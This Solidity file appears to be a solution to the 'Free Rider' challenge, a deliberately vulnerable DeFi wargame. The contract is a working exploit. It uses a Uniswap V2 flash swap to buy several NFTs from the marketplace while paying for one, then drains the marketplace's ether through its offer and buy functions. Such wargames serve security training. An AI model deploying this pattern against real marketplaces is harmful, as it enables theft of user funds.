// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";

contract FreeRiderSwapV2Callee is IUniswapV2Callee, IERC721Receiver {

    IWETH weth;
    FreeRiderNFTMarketplace marketplace;
    IERC721 nft;
    address owner;
    address devContract;
    uint256[] tokenIds;
    uint256 ntfAmount;

    constructor(IWETH _weth, FreeRiderNFTMarketplace _marketplace, IERC721 _nft, address _devContract, uint256 _ntfAmount) {
        weth = _weth;
        marketplace = _marketplace;
        nft = _nft;
        devContract = _devContract;
        owner = msg.sender;
        ntfAmount = _ntfAmount;
        for(uint256 i=0;i<ntfAmount;++i) { 
            tokenIds.push(i);
        }
    }
    
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata) external override {
        require(sender == owner, "only owner");
        uint256 price = 15 ether;
        weth.withdraw(amount0);
        marketplace.buyMany{value: price}(tokenIds); // buy 3 but only paied for 1
        nft.approve(address(marketplace), 0);
        nft.approve(address(marketplace), 1);
        uint256[] memory offerTokenIds = new uint256[](2); offerTokenIds[0]=0; offerTokenIds[1]=1;
        uint256[] memory offerPrices = new uint256[](2); offerPrices[0]=price; offerPrices[1]=price;
        marketplace.offerMany(offerTokenIds, offerPrices); // drain the rest 15 ether
        marketplace.buyMany{value: price}(offerTokenIds);
        weth.deposit{value: address(this).balance}();
        uint256 amount2payback = amount0 * 10031 / 10000;
        weth.transfer(msg.sender, amount2payback);
        for(uint256 i=0;i<ntfAmount;++i) {
            require(nft.ownerOf(i) == address(this), "contract is not an owner.");
            nft.safeTransferFrom(address(this), devContract, i, abi.encode(tx.origin));
        }
    }

    function onERC721Received(address, address, uint256 , bytes memory) external  pure override returns (bytes4) {  
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint wad) external;
}